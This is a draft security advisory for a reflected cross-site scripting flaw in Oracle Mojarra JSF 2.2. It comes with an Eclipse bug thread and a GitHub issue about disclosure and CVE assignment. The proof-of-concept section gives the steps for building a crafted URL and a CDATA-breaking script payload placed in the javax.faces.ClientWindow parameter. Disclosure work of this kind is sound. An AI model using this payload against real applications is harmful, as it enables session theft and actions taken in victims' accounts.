SEC Consult Vulnerability Lab Security Advisory < publishing date YYYYMMDD-0 >
=======================================================================
title: Reflected Cross-Site Scripting (XSS)
product: Oracle Mojarra JSF included in Java EE 7
vulnerable version: 2.2
fixed version:
CVE number:
impact: High
homepage: https://javaserverfaces.github.io/
found: 2018-11-12
by: Jean-Benjamin Rousseau (Office Zurich)

=======================================================================
Vendor description:
-------------------
"JavaServer Faces technology simplifies building user interfaces for
JavaServer applications. Developers can build web applications by
assembling reuseable UI components in a page; connecting these
components to an application data source; and wiring client-generated
events to server-side event handlers. This project provides information
on the continued development of the JavaServer Faces specification.
JavaServer Faces (JSF) is a JCP Standard technology for authoring
component based user interfaces on the Java EE platform."
Source: https://javaee.github.io/javaserverfaces-spec/
Business recommendation:
------------------------
By exploiting the vulnerability documented in this advisory, an attacker
can execute arbitrary scripts in the context of the web application in the
victim's browser. Besides performing arbitrary actions within the
application with the victim's account or manipulating the application's
interface, the attacker can potentially steal session tokens, redirect
the victim to external pages and perform attacks against their browser.
SEC Consult recommends to [tbd vendor patch / workaround]
Vulnerability overview/description:
-----------------------------------
The Oracle Mojarra implementation of JavaServer Faces (JSF) v2.2 is affected
by a Reflected Cross-Site Scripting (XSS). Oracle Mojarra JSF v2.2 is
the user interface standard for Java EE 7. This vulnerability only affects
the web applications which use AJAX requests and which have set
the javax.faces.CLIENT\_WINDOW\_MODE context parameter to "url"
in the web.xml file:
javax.faces.CLIENT\_WINDOW\_MODE
url

In this configuration, the web applications will use the
javax.faces.ClientWindow POST parameter for their AJAX requests.
Because the javax.faces.ClientWindow parameter is not properly sanitized,
an XSS attack is possible.
Proof of concept:
-----------------
In this Proof of Concept, the tests are based on PrimeFaces v6.0,
an open source framework for JSF. The tests can be executed on
any framework based on Oracle Mojarra JSF 2.2.
Step 1: Generate an AJAX request on the web application and intercept it.
POST /HelloPrimeFaces/faces/welcomePrimefaces.xhtml?jfwid=2a616ef87aeed7521b02ceb4e163:0 HTTP/1.1
Host: localhost:8080
Content-Length: 405
Accept: application/xml, text/xml, \*/\*; q=0.01
Origin: http://localhost:8080
X-Requested-With: XMLHttpRequest
Faces-Request: partial/ajax
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Accept-Encoding: gzip, deflate
Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: JSESSIONID=2a616ef87aeed7521b02ceb4e163
Connection: close
javax.faces.partial.ajax=true&javax.faces.source=j\_idt18%3AbtnSurname&javax.faces.partial.execute=j\_idt18%3AbtnSurname+j\_idt18%3Asurname&javax.faces.partial.render=j\_idt18%3Agrid&j\_idt18%3AbtnSurname=j\_idt18%3AbtnSurname&j\_idt18=j\_idt18&j\_idt18%3Afirstname=&j\_idt18%3Asurname=surname&javax.faces.ViewState=7025249133904776332%3A-921340693957557245&javax.faces.ClientWindow=2a616ef87aeed7521b02ceb4e163%3A0
Step 2: Transpose the POST parameters into GET parameters and
build a new URL with it.
http://localhost:8080/HelloPrimeFaces/faces/welcomePrimefaces.xhtml?jfwid=2a616ef87aeed7521b02ceb4e163:0&javax.faces.partial.ajax=true&javax.faces.source=j\_idt18%3AbtnSurname&javax.faces.partial.execute=j\_idt18%3AbtnSurname+j\_idt18%3Asurname&javax.faces.partial.render=j\_idt18%3Agrid&j\_idt18%3AbtnSurname=j\_idt18%3AbtnSurname&j\_idt18=j\_idt18&j\_idt18%3Afirstname=&j\_idt18%3Asurname=surname&javax.faces.ViewState=7025249133904776332%3A-921340693957557245&javax.faces.ClientWindow=2a616ef87aeed7521b02ceb4e163%3A0
Step 3: Strip out the javax.faces.ViewState GET parameter from the URL.
http://localhost:8080/HelloPrimeFaces/faces/welcomePrimefaces.xhtml?jfwid=2a616ef87aeed7521b02ceb4e163:0&javax.faces.partial.ajax=true&javax.faces.source=j\_idt18%3AbtnSurname&javax.faces.partial.execute=j\_idt18%3AbtnSurname+j\_idt18%3Asurname&javax.faces.partial.render=j\_idt18%3Agrid&j\_idt18%3AbtnSurname=j\_idt18%3AbtnSurname&j\_idt18=j\_idt18&j\_idt18%3Afirstname=&j\_idt18%3Asurname=surname&javax.faces.ClientWindow=2a616ef87aeed7521b02ceb4e163%3A0
Step 4: Prefix the javax.faces.ClientWindow GET parameter with
the following payload:
]]>alert('SEC Consult')
Resulting URL:
http://localhost:8080/HelloPrimeFaces/faces/welcomePrimefaces.xhtml?jfwid=2a616ef87aeed7521b02ceb4e163:0&javax.faces.partial.ajax=true&javax.faces.source=j\_idt18%3AbtnSurname&javax.faces.partial.execute=j\_idt18%3AbtnSurname+j\_idt18%3Asurname&javax.faces.partial.render=j\_idt18%3Agrid&j\_idt18%3AbtnSurname=j\_idt18%3AbtnSurname&j\_idt18=j\_idt18&j\_idt18%3Afirstname=&j\_idt18%3Asurname=surname&javax.faces.ClientWindow=alert('SEC+Consult')<![CDATA[2a616ef87aeed7521b02ceb4e163%3A0
Step 5: To trigger the XSS, the victim needs to browse to the crafted link
on the previous step.
Vulnerable / tested versions:
-----------------------------
The following version has been tested:
Oracle Mojarra JSF v2.2 included in Java EE 7
Oracle Mojarra JSF v2.3 included in Java EE 8 has not been tested

| [Description](show_bug.cgi?id=548244#c0)  Jean-Benjamin Rousseau [CLA](https://wiki.eclipse.org/ECA)    2019-06-13 10:50:52 EDT  ``` Created [attachment 278927](attachment.cgi?id=278927 "security advisory") [[details]](attachment.cgi?id=278927&action=edit "security advisory") security advisory  Dear Eclipse team,   SEC Consult is a leading consulting company for information security. During a short security crash test we have found a high-level security vulnerability within Oracle Mojarra JSF v2.2 and v2.3. The vulnerability has been reported to Oracle and is currently being fixed.  An incomplete fix has already been applied:  •	<https://github.com/javaserverfaces/mojarra/commit/618b35db4d0d0b09a54a5857ba34490a6963c5ab>  •	<https://github.com/javaserverfaces/mojarra/commit/6b8f467ac96c862364dff97655a8e4cea4ad3ec8>  We just made another request for a more secure fix.  The Oracle security team told us to contact you to request a CVE ID since the issue affects the Open Source release. The security advisory with proof of concept information is attached. Could you assign a new CVE ID to this vulnerability?  Best regards,  Jean-Benjamin Rousseau Security Consultant --------------------------------------------------------------------  SEC Consult (Schweiz) AG Turbinenstrasse 28 | 8005 Zurich | Switzerland P +41 44 271 77 70 | M +41 79 109 53 22 j.rousseau@sec-consult.com   SEC DEFENCE EMERGENCY-HOTLINE: +49 30 398 202 777   ADVISOR FOR YOUR INFORMATION SECURITY. --------------------------------------------------------------------- website | blog | twitter | xing | linkedin   Commercial register number: CH-020.3.040.983-2 Sales tax identification number: CHE-464.929.107 Management: Florian Lukavsky ```  [Comment 1](show_bug.cgi?id=548244#c1)  Wayne Beaton [CLA](https://wiki.eclipse.org/ECA)    2019-06-13 11:36:37 EDT  ``` I can only issue CVEs against Eclipse products, and I need the project lead (or their delegate) to make the request.  I've added the project lead in copy.  Arjan, can you validate that this is a vulnerability in Eclipse Mojarra and that you want the Eclipse Foundation to create a CVE. If yes, then I need you to provide some information.  There's help in the handbook.  <https://www.eclipse.org/projects/handbook/#vulnerability-cve>  Per our policy, I'm marking this as "committers-only" to prevent premature disclosure. We need to remove this flag before we can push the CVE (the timing of removing that flag up to that point is entirely at the discretion of the project). ```  [Comment 2](show_bug.cgi?id=548244#c2)  Jean-Benjamin Rousseau [CLA](https://wiki.eclipse.org/ECA)    2019-06-24 05:11:18 EDT  ``` For your information, the project team had already provided a first patch for this vulnerability. It can be found at:  - <https://github.com/javaserverfaces/mojarra/commit/618b35db4d0d0b09a54a5857ba34490a6963c5ab>  - <https://github.com/javaserverfaces/mojarra/commit/6b8f467ac96c862364dff97655a8e4cea4ad3ec8>  The patch is not sufficient and I requested them to apply a stronger restriction on the user inputs. We are still waiting for an answer and a fix before releasing the advisory.  Would it be possible to have an answer regarding the attribution of the CVE ID before the end of July?  Thanks. ```  [Comment 3](show_bug.cgi?id=548244#c3)  Jean-Benjamin Rousseau [CLA](https://wiki.eclipse.org/ECA)    2019-07-01 06:02:31 EDT  ``` Hello,  A patch has also been applied to the following Git repository: <https://github.com/eclipse-ee4j/mojarra/issues/4556>  Can you update me regarding the assignment of the CVE ID?  Thanks, Jean-Benjamin Rousseau ```  [Comment 4](show_bug.cgi?id=548244#c4)  Jean-Benjamin Rousseau [CLA](https://wiki.eclipse.org/ECA)    2019-07-12 15:42:37 EDT  ``` Hello,  A merge request with the patch has been applied on the 17th of May: <https://github.com/eclipse-ee4j/mojarra/pull/4567> The vulnerability has been fully fixed.  Please, update me regarding the status of the CVE request.  Best regards, Jean-Benjamin Rousseau ```  [Comment 5](show_bug.cgi?id=548244#c5)  Jean-Benjamin Rousseau [CLA](https://wiki.eclipse.org/ECA)    2019-08-23 07:22:01 EDT  ``` Hello,  Any news on your side?  Regards, Jean-Benjamin ```  [Comment 6](show_bug.cgi?id=548244#c6)  arjan tijms [CLA](https://wiki.eclipse.org/ECA)    2019-08-23 18:14:36 EDT  ``` Hi, this is the first time I get to see this bug and the CVE request.  I'll study the requirements/handbook and will issue a request next week as soon as I get the change. ```  [Comment 7](show_bug.cgi?id=548244#c7)  Jean-Benjamin Rousseau [CLA](https://wiki.eclipse.org/ECA)    2019-08-28 10:23:32 EDT  ``` Hello,  Thank you for your response.  I checked for the patches applied to JSF. I found two:  - <https://github.com/javaserverfaces/mojarra/commit/618b35db4d0d0b09a54a5857ba34490a6963c5ab>  - <https://github.com/eclipse-ee4j/mojarra/commit/8f70f2bd024f00ecd5b3dcca45df73edda29dcee>  From my perspective, none of those patches covers properly the vulnerability. Have you planned to review this security issue?  An advisory is ready to be released on our side. However, we wait for a proper patch to be applied and for your CVE request to be issued.  Thanks for your cooperation.  Best Regards, Jean-Benjamin Rousseau ```  [Comment 8](show_bug.cgi?id=548244#c8)  Jean-Benjamin Rousseau [CLA](https://wiki.eclipse.org/ECA)    2019-09-11 05:20:28 EDT  ``` Hello,  Any news on your side? ```  [Comment 9](show_bug.cgi?id=548244#c9)  Wayne Beaton [CLA](https://wiki.eclipse.org/ECA)    2019-09-11 12:05:56 EDT  ``` Reminder: project committers, I need you to engage. If you believe that a CVE should be created, follow the instructions in the handbook.  <https://www.eclipse.org/projects/handbook/#vulnerability-cve>  Per the security policy, we'll open this bug report for general access three months after the initial report (September 13/2019). ```  [Comment 10](show_bug.cgi?id=548244#c10)  Wayne Beaton [CLA](https://wiki.eclipse.org/ECA)    2019-09-26 14:46:11 EDT  ``` I've removed the Committer-only flag per the security policy. ```  [Comment 11](show_bug.cgi?id=548244#c11)  Wayne Beaton [CLA](https://wiki.eclipse.org/ECA)    2019-12-18 14:21:03 EST  ``` Adding the Eclipse EE4J Security Team representative to the bug.  Ajay, can you help the project team determine whether or not a CVE is warranted here and, if so, help them compose the information that we require to submit this to the central authority?  There's help here:  <https://www.eclipse.org/projects/handbook/#vulnerability-cve> ```  [Comment 12](show_bug.cgi?id=548244#c12)  Wayne Beaton [CLA](https://wiki.eclipse.org/ECA)    2020-01-10 11:37:42 EST  ``` Arjan, I need a resolution here. Do we assign a CVE or not?  If yes, I need some information from you.  <https://www.eclipse.org/projects/handbook/#vulnerability-cve> ```  [Comment 13](show_bug.cgi?id=548244#c13)  Frederic Gurr [CLA](https://wiki.eclipse.org/ECA)    2021-12-23 06:45:11 EST  ``` This issue has been migrated to <https://gitlab.eclipse.org/eclipsefdn/helpdesk/-/issues/430>. ``` |  |

## Description

![@ruolli](https://avatars.githubusercontent.com/u/20091568?u=8f137f996273119ca7774ef7b58f71de7da34fb4&v=4&size=48)[ruolli](https://github.com/ruolli)opened [on Apr 3, 2019](https://github.com/eclipse-ee4j/mojarra/issues/4556#issue-428801416)

This is a security bug. Please fix it in accordance with:

[Http://security.us.oracle.com/doku.php?id=gps:resource:process:bugfix](http://security.us.oracle.com/doku.php?id=gps:resource:process:bugfix)

Dear Oracle team,

SEC Consult is a leading consulting company for information security. During

a short security crash test we have found a high-level security vulnerability

within Oracle Mojarra JSF v2.2.

The encrypted security advisory with proof of concept information is

attached. I have also attached my public PGP and S/MIME keys for further

encrypted communication. Please provide us with an estimate on when the

vulnerability will be fixed in order to set the actual release date. Please

keep us informed if there are any changes.

Please also see our attached responsible disclosure policy (PDF) which

defines the process of publication of the security advisory. The security

advisory will be released according to the chapter 5.3, phase 3 "Public

disclosure", the latest possible release date is 50 days from now: 2019-01-11

Keep in mind that we can't give any other free support besides providing the

security advisory information.

Best regards,

Jean-Benjamin Rousseau

Security Consultant
